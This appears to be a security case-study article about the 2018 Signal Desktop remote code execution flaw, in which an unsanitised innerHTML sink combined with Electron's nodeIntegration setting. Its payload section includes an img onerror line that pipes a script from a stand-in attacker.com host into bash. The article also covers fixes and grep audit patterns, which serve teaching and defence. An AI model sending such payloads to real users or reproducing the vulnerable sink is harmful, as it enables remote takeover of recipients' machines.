---
title: Signal Desktop RCE 2018
description: Signal Desktop remote code execution via nodeIntegration in 2018 — message text executes arbitrary code
---

# Signal Desktop RCE 2018

Signal — the app that privacy-conscious users chose specifically because they cared about security — had a vulnerability where receiving a message could execute arbitrary code on the recipient's computer. The irony is almost unbearably complete: the people who went out of their way to use the most security-focused messaging app were the ones exposed to this attack.

And the attack bypassed Signal's core value proposition entirely. It didn't break Signal's encryption. It didn't need to. You could send an encrypted message that, once decrypted and rendered, ran arbitrary code on the recipient's machine. The cryptography was irrelevant.

---

## Summary

| Field | Value |
|-------|-------|
| **ID** | No CVE assigned (vendor-patched rapidly) |
| **Application** | Signal Desktop |
| **Vulnerability Class** | HTML injection → nodeIntegration:true → RCE |
| **Reported By** | Multiple independent researchers |
| **Year** | 2018 |
| **Impact** | RCE via a single crafted Signal message |
| **User Interaction** | Zero-click — message auto-renders |

---

## Background: Who Uses Signal

Signal is popular among journalists, human rights activists, lawyers, political dissidents, and security professionals — people who have specific, high-stakes reasons to care about communication security. These users often have sophisticated adversaries. A zero-click RCE from a received message meant that anyone with a Signal contact (or the ability to be added to a group with the target) could compromise the target's computer.

The threat model inversion: the more important security is to you, the more likely you are to use Signal, and therefore the more likely you were to be targeted via this vulnerability.

---

## The Vulnerability

Signal Desktop was built on an older Electron version with `nodeIntegration: true` as the default. Signal's message rendering passed user message content through a Markdown renderer before displaying it:

```javascript
// Renderer:
function renderMessage(message) {
  const htmlContent = markdownToHtml(message.body);
  messageContainer.innerHTML = htmlContent;  // SINK: unsanitized HTML from message content
}
```

The Markdown renderer output was inserted via `innerHTML` without sanitization. Because `nodeIntegration: true`, any JavaScript executing in the renderer had direct access to `require('child_process')` — no IPC needed, no preload bypass needed.

---

## The Payload

A Signal message containing:

```
<img src=x onerror="require('child_process').exec('open -a Calculator')">
```

When Signal Desktop rendered this message, the JavaScript executed. On macOS: Calculator opened. On Linux: `exec()` ran. On Windows: equivalent payload worked identically.

A real attack payload:

```
<img src=x onerror="require('child_process').exec('curl http://attacker.com/sh | bash')">
```

One message → shell executes arbitrary commands on the recipient's machine.

---

## Why Signal Wasn't Uniquely Careless

Signal in 2018 was not an outlier. `nodeIntegration: true` was Electron's default until version 5.0 (released 2019). Every Electron app that didn't explicitly set `nodeIntegration: false` had the same exposure. The difference was that Signal's threat model made the consequences dramatically more severe.

The mental model failure was industry-wide: developers thought "Electron is like a browser." Browsers render untrusted HTML safely because browsers have decades of security architecture built around that use case — sandbox, same-origin policy, no native API access. Electron renders HTML in a Node.js process. Those are fundamentally different threat models, and treating them as equivalent was the source of an entire generation of Electron vulnerabilities.

---

## Fix and Timeline

Signal's team responded within hours — patch shipped the same day as public disclosure. This response time is still one of the fastest on record for a critical vulnerability in a major app.

**Fix:** Two changes, both necessary:
1. Upgraded to newer Electron with `nodeIntegration: false` as default
2. Added HTML sanitization to message rendering (strip all HTML, or use a strict allowlist)

Both fixes were necessary. Fixing only `nodeIntegration` would have left a stored XSS in the renderer — which could be escalated via other paths. Fixing only sanitization while leaving `nodeIntegration: true` would have left any future XSS as immediate RCE. Defense in depth means both layers hold.

---

## Grep Patterns for This Class

```bash
# Check Electron version (pre-5.0 = risky defaults):
cat package.json | grep '"electron"'
# If < 5.0 and nodeIntegration not explicitly set to false: assume XSS = RCE

# Check for explicit nodeIntegration setting:
grep -r "nodeIntegration" --include="*.js" .
# If not found: app relies on Electron defaults (which changed at v5)

# Check for message rendering with innerHTML:
grep -r "innerHTML\|dangerouslySetInnerHTML" --include="*.js" . | \
  grep -i "message\|content\|body\|text\|note\|post"

# Check Markdown rendering libraries (especially older versions):
cat package.json | grep -E '"marked|showdown|markdown-it|snarkdown|commonmark"'
```

If `nodeIntegration` is `true` (or the app is on Electron < 5.0 without explicit `false`), treat any XSS as automatic RCE. Don't stop at "I found stored XSS in the message field." Keep going — that's the first step, not the finding.

---

## The Broader Lesson

```
XSS in Electron app where nodeIntegration:true is not a web vulnerability.
It's a remote code execution vulnerability.
```

The escalation is automatic. You don't need to find a preload bypass or an unvalidated IPC handler. You just call `require('child_process')` directly from your XSS payload. The chain from "stored XSS" to "attacker runs code on victim's machine" is a single step.

This is why the Signal 2018 RCE matters as a case study: it crystallizes the danger of the "Electron is like a browser" mental model and shows exactly what happens when that model fails.

---

## Similar Vulnerabilities in the Same Era

| App | Year | Vector | Node Integration |
|-----|------|--------|-----------------|
| Signal Desktop | 2018 | Markdown → innerHTML | nodeIntegration:true |
| Mattermost | 2018 | Markdown message | nodeIntegration:true |
| RocketChat | 2018-2019 | Message HTML | nodeIntegration:true |
| Element/Matrix | 2022 | Matrix message HTML | nodeIntegration:true |
| Joplin | 2019-2022 | Note Markdown | nodeIntegration:true |

All had the same root cause. The difference was how long it took each one to be found and reported.
